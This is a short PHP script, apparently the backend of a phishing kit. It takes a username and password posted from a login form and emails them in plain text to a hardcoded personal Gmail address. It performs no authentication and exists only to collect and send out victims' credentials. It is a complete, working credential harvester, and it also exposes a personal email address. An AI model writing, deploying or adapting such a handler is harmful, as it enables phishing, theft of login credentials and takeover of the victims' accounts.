<?php
// Obtener los datos del JSON enviado
$data = json_decode(file_get_contents('php://input'), true);

$username = $data['username'];
$password = $data['password'];

$to = 'papifrankely@gmail.com';
$subject = 'Datos de inicio de sesión';
$message = "Usuario: $username\nContraseña: $password";
$headers = 'From: noreply@tusitio.com' . "\r\n" . // Cambia por tu dominio
           'Reply-To: noreply@tusitio.com' . "\r\n"; // Cambia por tu dominio

// Enviar el correo
if (mail($to, $subject, $message, $headers)) {
    http_response_code(200);
} else {
    http_response_code(500);
}
?>
